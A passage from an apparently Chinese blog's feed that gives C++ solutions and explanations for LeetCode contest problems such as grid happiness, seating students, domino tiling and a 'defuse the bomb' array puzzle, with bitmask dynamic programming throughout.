class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dp[N * N][<span class="number">243</span>][M][M];</span><br><span class="line"><span class="keyword">int</span> p3[N];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">int</span> mask, <span class="keyword">int</span> rem_i, <span class="keyword">int</span> rem_e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pos == n * m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span>&amp; ret = dp[pos][mask][rem_i][rem_e];</span><br><span class="line">        <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>) <span class="keyword">return</span> ret;</span><br><span class="line">        ret = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; a(m); <span class="comment">// 1: intro; 2: extro</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, t = mask; i &lt; m; ++i, t /= <span class="number">3</span>) a[i] = t % <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">int</span> x = pos / m, y = pos % m;</span><br><span class="line">        <span class="comment">// put nothing</span></span><br><span class="line">        ret = max(ret, solve(pos + <span class="number">1</span>, mask - p3[y] * a[y], rem_i, rem_e));</span><br><span class="line">        <span class="comment">// put intro</span></span><br><span class="line">        <span class="keyword">if</span> (rem_i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> score = <span class="number">120</span>;</span><br><span class="line">            <span class="keyword">if</span> (y - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y - <span class="number">1</span>] == <span class="number">1</span>) score -= <span class="number">60</span>;</span><br><span class="line">            <span class="keyword">if</span> (y - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y - <span class="number">1</span>] == <span class="number">2</span>) score -= <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span> (x - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y] == <span class="number">1</span>) score -= <span class="number">60</span>;</span><br><span class="line">            <span class="keyword">if</span> (x - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y] == <span class="number">2</span>) score -= <span class="number">10</span>;</span><br><span class="line">            ret = max(ret, score + solve(pos + <span class="number">1</span>, mask - p3[y] * a[y] + p3[y], rem_i - <span class="number">1</span>, rem_e));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// put extro</span></span><br><span class="line">        <span class="keyword">if</span> (rem_e &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> score = <span class="number">40</span>;</span><br><span class="line">            <span class="keyword">if</span> (y - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y - <span class="number">1</span>] == <span class="number">1</span>) score -= <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span> (y - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y - <span class="number">1</span>] == <span class="number">2</span>) score += <span class="number">40</span>;</span><br><span class="line">            <span class="keyword">if</span> (x - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y] == <span class="number">1</span>) score -= <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span> (x - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; a[y] == <span class="number">2</span>) score += <span class="number">40</span>;</span><br><span class="line">            ret = max(ret, score + solve(pos + <span class="number">1</span>, mask - p3[y] * a[y] + p3[y] * <span class="number">2</span>, rem_i, rem_e - <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getMaxGridHappiness</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">      <span class="keyword">this</span>-&gt;m = m;</span><br><span class="line"></span><br><span class="line">        p3[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; N; ++i) p3[i] = p3[i - <span class="number">1</span>] * <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">memset</span>(dp, <span class="number">255</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line">        <span class="keyword">int</span> ret = solve(<span class="number">0</span>, <span class="number">0</span>, x, y);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><ul><li><ol><li>参加考试的最大学生数<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> dp[<span class="number">64</span>][<span class="number">256</span>][<span class="number">2</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">bitTst</span><span class="params">(<span class="keyword">int</span> mask,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((mask&amp;(<span class="number">1</span>&lt;&lt;n))&gt;&gt;n) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">bitClr</span><span class="params">(<span class="keyword">int</span> mask,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mask&amp;(~(<span class="number">1</span>&lt;&lt;n));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">bitSet</span><span class="params">(<span class="keyword">int</span> mask,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mask|(<span class="number">1</span>&lt;&lt;n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pos,<span class="keyword">int</span> left,<span class="keyword">int</span> mask,<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&gt;&amp; seats)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> row = seats.size();</span><br><span class="line">        <span class="keyword">int</span> col = seats[<span class="number">0</span>].size();</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(pos == row*col) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(dp[pos][mask][left] != INF) <span class="keyword">return</span> dp[pos][mask][left];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> x = pos/col;</span><br><span class="line">        <span class="keyword">int</span> y = pos%col;</span><br><span class="line">        <span class="keyword">int</span> curr = bitTst(mask,y);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*empty*/</span></span><br><span class="line">        ret = max(ret,dfs(pos+<span class="number">1</span>,curr,bitClr(mask,y),seats));</span><br><span class="line">        <span class="keyword">if</span>(seats[x][y] == <span class="string">'.'</span>)&#123;</span><br><span class="line">            <span class="comment">/*sit down*/</span></span><br><span class="line">            <span class="keyword">bool</span> valid_left = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">bool</span> valid_left_top = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">bool</span> valid_right_top = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(y<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; left) valid_left_top = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span>(y<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; bitTst(mask,y<span class="number">-1</span>)) valid_left = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span>(y+<span class="number">1</span> &lt; col &amp;&amp; bitTst(mask,y+<span class="number">1</span>)) valid_right_top = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span>(valid_left&amp;&amp;valid_left_top&amp;&amp;valid_right_top)&#123;</span><br><span class="line">                ret = max(ret,<span class="number">1</span> + dfs(pos+<span class="number">1</span>,curr,bitSet(mask,y),seats));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        dp[pos][mask][left] = ret;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxStudents</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&gt;&amp; seats)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> row = seats.size();</span><br><span class="line">        <span class="keyword">int</span> col = seats[<span class="number">0</span>].size();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(dp,INF,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        <span class="keyword">int</span> ret = dfs(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,seats);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></li><li>LCP 04. 覆盖<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">64</span>][<span class="number">256</span>];</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> row,col;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">bitTst</span><span class="params">(<span class="keyword">int</span> mask,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((mask&amp;(<span class="number">1</span>&lt;&lt;n))&gt;&gt;n) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">bitClr</span><span class="params">(<span class="keyword">int</span> mask,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mask&amp;(~(<span class="number">1</span>&lt;&lt;n));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">bitSet</span><span class="params">(<span class="keyword">int</span> mask,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mask|(<span class="number">1</span>&lt;&lt;n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pos,<span class="keyword">int</span> mask,<span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; &amp; broken)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(pos == row*col) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(dp[pos][mask] != INF) <span class="keyword">return</span> dp[pos][mask];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> x = pos/col;</span><br><span class="line">        <span class="keyword">int</span> y = pos%col;</span><br><span class="line">        <span class="comment">/*empty*/</span></span><br><span class="line">        ret = max(ret,dfs(pos+<span class="number">1</span>,bitClr(mask,y),broken));</span><br><span class="line">        <span class="comment">/*fill one*/</span></span><br><span class="line">        <span class="keyword">if</span>(!broken.count(pos))&#123;</span><br><span class="line">            <span class="comment">/*check left*/</span></span><br><span class="line">            <span class="keyword">if</span>(y<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; !broken.count(pos<span class="number">-1</span>) &amp;&amp; !bitTst(mask,y<span class="number">-1</span>))&#123;</span><br><span class="line">                ret = max(ret,<span class="number">1</span> + dfs(pos+<span class="number">1</span>,mask|(<span class="number">1</span>&lt;&lt;(y<span class="number">-1</span>))|(<span class="number">1</span>&lt;&lt;y),broken));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*check top*/</span></span><br><span class="line">            <span class="keyword">if</span>(x<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; !broken.count((x<span class="number">-1</span>)*col+y) &amp;&amp; !bitTst(mask,y))&#123;</span><br><span class="line">                ret = max(ret,<span class="number">1</span> + dfs(pos+<span class="number">1</span>,mask|(<span class="number">1</span>&lt;&lt;y),broken));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        dp[pos][mask] = ret;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">domino</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; broken)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;row = n;</span><br><span class="line">        <span class="keyword">this</span>-&gt;col = m;</span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; b;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : broken) b.insert(v[<span class="number">0</span>]*col + v[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">memset</span>(dp,INF,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        <span class="keyword">return</span> dfs(<span class="number">0</span>,<span class="number">0</span>,b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title="#"></a>#</h2>欢迎关注和打赏，感谢支持！</li><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-contest-215&quot;&gt;&lt;a href=&quot;#leetcode-contest-215&quot; class=&quot;headerlink&quot; title=&quot;leetcode  contest 215&quot;&gt;&lt;/a&gt;leetcode  contest 215&lt;/h1&gt;&lt;p&gt;周赛的题目，前三题比较容易，前三题基本上送分的题目，大概差不多也就40分钟搞定前三题，目测大概也就200名左右，最后一题确实不知道怎么做，直接放弃算了。&lt;/p&gt;&lt;h2 id=&quot;5601-设计有序流&quot;&gt;&lt;a href=&quot;#5601-设计有序流&quot; class=&quot;headerlink&quot; title=&quot;5601. 设计有序流&quot;&gt;&lt;/a&gt;5601. 设计有序流&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;有 n 个 (id, value) 对，其中 id 是 1 到 n 之间的一个整数，value 是一个字符串。不存在 id 相同的两个 (id, value) 对。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  双周赛39场</title>
    <link href="http://yoursite.com/2020/11/15/225/"/>
    <id>http://yoursite.com/2020/11/15/225/</id>
    <published>2020-11-14T16:26:13.346Z</published>
    <updated>2020-11-18T15:45:59.236Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-biweekly-contest-39"><a href="#leetcode-biweekly-contest-39" class="headerlink" title="leetcode biweekly contest 39"></a>leetcode biweekly contest 39</h1><p>双周赛的题目，前三题比较容易，第四题是经典的状态压缩空间，竟然没有做出来，还是对算法的数量度掌握不够，对于状态子空间里的遍历还是没有掌握住.最终排名如下：<br><img src="https://i.loli.net/2020/11/15/EV9JLbdmjH74iIY.png" alt="1"></p><h2 id="5550-拆炸弹"><a href="#5550-拆炸弹" class="headerlink" title="5550. 拆炸弹"></a>5550. 拆炸弹</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>你有一个炸弹需要拆除，时间紧迫！你的情报员会给你一个长度为 n 的 循环 数组 code 以及一个密钥 k 。</p><a id="more"></a><p>为了获得正确的密码，你需要替换掉每一个数字。所有数字会 同时 被替换。</p><ul><li>如果 k &gt; 0 ，将第 i 个数字用 接下来 k 个数字之和替换。</li><li>如果 k &lt; 0 ，将第 i 个数字用 之前 k 个数字之和替换。</li><li>如果 k == 0 ，将第 i 个数字用 0 替换。<br>由于 <code>code</code> 是循环的， <code>code[n-1]</code> 下一个元素是 <code>code[0]</code> ，且 <code>code[0]</code> 前一个元素是 <code>code[n-1]</code>。</li></ul><p>给你 循环 数组 <code>code</code> 和整数密钥 <code>k</code> ，请你返回解密后的结果来拆除炸弹！</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：code = [<span class="number">5</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">4</span>], k = <span class="number">3</span></span><br><span class="line">输出：[<span class="number">12</span>,<span class="number">10</span>,<span class="number">16</span>,<span class="number">13</span>]</span><br><span class="line">解释：每个数字都被接下来 <span class="number">3</span> 个数字之和替换。解密后的密码为 [<span class="number">7</span>+<span class="number">1</span>+<span class="number">4</span>, <span class="number">1</span>+<span class="number">4</span>+<span class="number">5</span>, <span class="number">4</span>+<span class="number">5</span>+<span class="number">7</span>, <span class="number">5</span>+<span class="number">7</span>+<span class="number">1</span>]。注意到数组是循环连接的。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：code = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], k = <span class="number">0</span></span><br><span class="line">输出：[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">解释：当 k 为 <span class="number">0</span> 时，所有数字都被 <span class="number">0</span> 替换。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：code = [<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">3</span>], k = <span class="number">-2</span></span><br><span class="line">输出：[<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">13</span>]</span><br><span class="line">解释：解密后的密码为 [<span class="number">3</span>+<span class="number">9</span>, <span class="number">2</span>+<span class="number">3</span>, <span class="number">4</span>+<span class="number">2</span>, <span class="number">9</span>+<span class="number">4</span>] 。注意到数组是循环连接的。如果 k 是负数，那么和为 之前 的数字。</span><br></pre></td></tr></table></figure></p><p>提示:</p><ul><li><code>n == code.length</code></li><li><code>1 &lt;= n &lt;= 100</code></li><li><code>1 &lt;= code[i] &lt;= 100</code></li><li><code>-(n - 1) &lt;= k &lt;= n - 1</code></li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/defuse-the-bomb" target="_blank" rel="noopener">https://leetcode-cn.com/problems/defuse-the-bomb</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  暴力</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>数据量太小，直接暴力即可完成，我们直接依次循环从<code>[1,abs(k)]</code>的情况。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; decrypt(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; code, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">int</span> n = code.size();</span><br><span class="line">        <span class="keyword">int</span> sign = k &gt; <span class="number">0</span> ? <span class="number">1</span>:<span class="number">-1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= k*sign; ++j)&#123;</span><br><span class="line">                sum += code[(i+sign*j+n)%n];</span><br><span class="line">            &#125;</span><br><span class="line">            ans.push_back(sum);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5551-使字符串平衡的最少删除次数"><a href="#5551-使字符串平衡的最少删除次数" class="headerlink" title="5551. 使字符串平衡的最少删除次数"></a>5551. 使字符串平衡的最少删除次数</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你一个字符串 <code>s</code> ，它仅包含字符 <code>&#39;a&#39;</code>和<code>&#39;b&#39;</code>​​​​ 。</p><p>你可以删除 s 中任意数目的字符，使得 s 平衡 。我们称 s 平衡的 当不存在下标对 <code>(i,j)</code>满足 <code>i &lt; j</code>且 <code>s[i] = &#39;b&#39;</code> 同时 <code>s[j]= &#39;a&#39;</code> 。</p><p>请你返回使 <code>s</code>平衡 的 最少 删除次数。</p><p>示例 1：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：s = <span class="string">"aababbab"</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：你可以选择以下任意一种方案：</span><br><span class="line">下标从 <span class="number">0</span> 开始，删除第 <span class="number">2</span> 和第 <span class="number">6</span> 个字符（<span class="string">"aababbab"</span> -&gt; <span class="string">"aaabbb"</span>），</span><br><span class="line">下标从 <span class="number">0</span> 开始，删除第 <span class="number">3</span> 和第 <span class="number">6</span> 个字符（<span class="string">"aababbab"</span> -&gt; <span class="string">"aabbbb"</span>）。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = <span class="string">"bbaaaaabb"</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：唯一的最优解是删除最前面两个字符。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= s.length &lt;= 105</code></li><li><code>s[i]</code>要么是 <code>&#39;a&#39;</code>要么是<code>&#39;b&#39;​</code> 。</li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-deletions-to-make-string-balanced" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-deletions-to-make-string-balanced</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 滑动窗口或者动态规划。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>我们假设最终的目标字符串为原始字符串从<code>i</code>处断开，则表示原始字符串中从<code>[0,i]</code>处的字符中最终全部变为<code>a</code>,将从<code>[i+1,n-1]</code>处的字符全部变为<code>b</code>，因此我们需要删除从<code>[0,i]</code>处中<code>b</code>的数目，从<code>[i+1,n-1]</code>处<code>a</code>的数目,我们枚举<code>i</code>即可:<script type="math/tex; mode=display">ans = min(ans,countB(0,i)+countA(i+1,n-1)) \qquad i\in[0,n-1]</script></li><li>这个算法感觉是最直观的算法。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 